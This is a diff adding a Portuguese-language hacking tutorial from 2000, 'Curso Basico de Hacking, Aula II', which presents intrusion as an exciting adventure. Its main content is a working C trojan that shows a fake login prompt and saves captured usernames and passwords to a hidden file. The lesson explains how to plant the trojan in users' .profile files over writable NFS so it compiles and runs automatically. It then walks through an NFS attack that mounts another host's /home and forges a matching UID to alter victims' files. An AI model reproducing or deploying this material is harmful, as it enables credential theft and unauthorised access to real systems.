@@ -1,0 +1,181 @@
+#########################################################################
+########################### UNSEKURITY SCENE ############################
+#########################################################################
+
+
+                        CURSO BASICO DE HACKING
+
+                                AULA II
+
+
+Desenvolvido por Nash Leon.
+nashleon@yahoo.com.br
+08/12/2000
+
+* INDICE *
+
+Tecnicas Antigas de Invasao (I Parte)
+
+
+* Tecnicas Antigas de Invasao 
+
+Invadir redes eh uma aventura indescritivel! Somente quem de fato ousou
+efetuar tal acao sabe a adrenalina e a emocao envolvida! No entanto,
+devemos ter em mente que o ato de invasao por sih soh nao caracteriza
+um hacking! Mais precisamente, nem todo invasor eh um hacker! 
+
+Descrever as tecnicas antigas serve para nos dar uma visao basica de
+quao diferente eram as coisas quando comparadas com as de hoje em dia!
+Hoje, nos vemos um monte de script kiddies alterando home pages, usando
+exploits feitos por terceiros que eles nem mesmo sabem o que de fato
+estah executando! No passado nao havia toda esta facilidade e muitos
+dos hackers antigos tiveram que ralar pesado para obterem conhecimento
+de como agir, fucando e se virando sozinho!
+
+As tecnicas antigas basicamente eram usadas em BBSs, redes de VTX(Video
+Texto), redes universitarias e na propria Internet.Algumas destas
+tecnicas serviram de preludio para as que vieram a ser mais conhecidas,
+na medida em que o hacking aumentava, aumentava tambem a seguranca(mas nao
+na mesma proporcao).
+
+Uma das tecnicas mais conhecidas de invasao era executar um brutal force
+em busca de contas validas.Como os modems eram bem lentos, imaginamos
+que esta era uma tarefa ardua! Mas uma vez obtida uma conta valida,
+um simples "cp /etc/passwd" nos daria todas as contas do sistema invadido.
+No entanto, a criptografia mais famosa usada na epoca era o DES, de modo
+que os computadores eram lentissimos, e tentar "quebrar"(crackear) uma
+senha nao era uma das tarefas mais faceis e rapidas! Muitos fucadores
+preferiam executar trojans de diretorios, ao estilo do que segue abaixo:
+
+---------------------------- trojdir.c ---------------------------------
+
+/* Simples trojan de diretorio que emula um prompt e captura
+   a senha em texto limpo...Bom p/ ser usado em sistemas NFS
+   que nao permitem conexao via rlogin...
+   Desenvolvido por Nash Leon vulgo coracaodeleao.
+   nashleon@yahoo.com.br
+   OBS: Nao me responsabilizo pelo mau uso deste programa.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+extern char *getpass();
+
+main(int argc, char *argv[])
+{
+FILE *catador;
+char login[50], *senha;
+int i;
+/* Abaixo segue o prompt do sistema, altere-o
+p/ que se pareca com o prompt da vitima */
+printf("Login incorrect\n\n");
+printf("Conectiva Red Sux login: ");
+scanf("%s",&login);
+
+/* Se ligue aki, isso varia muito tb de sistema p/ sistema */
+senha = getpass("Password:");
+
+catador = fopen("./.arquivo.txt" ,"a+");
+if(!catador){exit(0);}
+
+fputs("login:",catador);
+for(i=0;login[i];i++)
+putc(login[i],catador);
+putc('\n',catador);
+putc('\n',catador);
+
+fputs("senha:",catador);
+for(i=0;senha[i];i++)
+putc(senha[i],catador);
+putc('\n',catador);
+putc('\n',catador);
+return 0;
+}
+
+/* Essa tecnica pode ser usada em conjunto com permissoes
+em diretorios via NFS(su user)... basta modificar o arquivo .profile
+ou .bashrc... dependendo do sistema.. um exemplo tipico seria
+colocar ele em todos os dir dos usuarios mandando o arquivo que vai
+ser escrito,no caso acima (./.arquivo.txt) p/ um dir onde todos tem
+permissao de escrita... ex: (/var/tmp/.arquivo.txt).Atencao..veja se
+voce tera acesso a esse arquivo ou diretorio depois.
+Em caso de sistemas diferentes dos que voce possui como o codigo estah
+em c padrao vc pode chamar a rotina de algum compilador p/ que o codigo
+possa ser compilado e em seguida chamar a execucao do mesmo...abaixo
+seguem exemplos do que se pode fazer com isso:
+[*] No diretorio do usario..colocar num arquivo .profile:
+
+#Diretorio setado p/ arquivos temporarios
+/var/tmp/temp
+#FIM DO ARQUIVO
+
+[*] /var/tmp/temp -> eh o arquivo que ira ser executado.
+ele poderia conter:
+#
+gcc -o /var/tmp/.ptnl /var/tmp/.ptnl.c
+./ptnl
+#FIM DO ARQUIVO
+onde:
+gcc compila o arquivo, em seguida ele eh executado.
+*/
+
+------------------------------------------------------------------------
+
+Como vemos no programa acima, este era apenas um dos milhares de
+artificios para se obter acesso a contas validas, bem como senhas validas.
+No codigo acima, podemos ver os argumentos citarem problemas com NFS, sem
+duvida que esta tecnica ainda eh muito usada, mas ela nao eh uma tecnica nova.
+Um fucador poderia obter acesso ao sistema usando mah configuracao de 
+servidores NFS e atraves da montagem, invadir um servidor.Mas para isso ele 
+teria que ter um Unix a sua disposicao, podendo-se usar "hosts-ponte" para 
+se efetuar o ataque.
+
+A tecnica consiste em primeiro obter informacoes do host alvo:
+
+# rpcinfo -p localhost
+   program vers proto   port
+    100000    2   tcp    111  portmapper
+    100000    2   udp    111  portmapper
+    100003    2   udp   2049  nfs
+    100003    2   tcp   2049  nfs
+    150001    1   udp    692  pcnfsd
+    150001    2   udp    692  pcnfsd
+    150001    1   tcp    695  pcnfsd
+    150001    2   tcp    695  pcnfsd
+    100005    1   udp    695  mountd
+    100005    2   udp    695  mountd
+    100005    1   tcp    698  mountd
+    100005    2   tcp    698  mountd
+
+
+# showmount -e localhost
+Export list for localhost:
+/home <anon clnt>
+
+Uma vez obtida informacos sobre quais diretorios estariam acessiveis,um
+atacante poderia entao monta-los na sua maquina local.
+
+# mount -nt nfs localhost:/home /mnt
+# ls /mnt
+ftp/  korgan/  martin/  nashleon/  petidomo/
+
+Com o diretorio uma vez montado, o fucador poderia alterar seu proprio
+passwd (o do fucador-atacante) e assim sobrescrever e alterar arquivos.Para
+isso bastaria incluir uma entrada no passwd para um usuario do sistema
+alvo, algo como "nashleon" no exemplo, com a mesma UID/GID deste usuario
+no sistema alvo.
+
+Estas sao apenas algumas da dezenas de tecnicas antigas e amplamente
+difundidas Internet a fora.Nas proximas aulas poderemos ver mais sobre
+elas.
+
+Um Abraco.
+
+
+							Nash Leon.
+
+
+
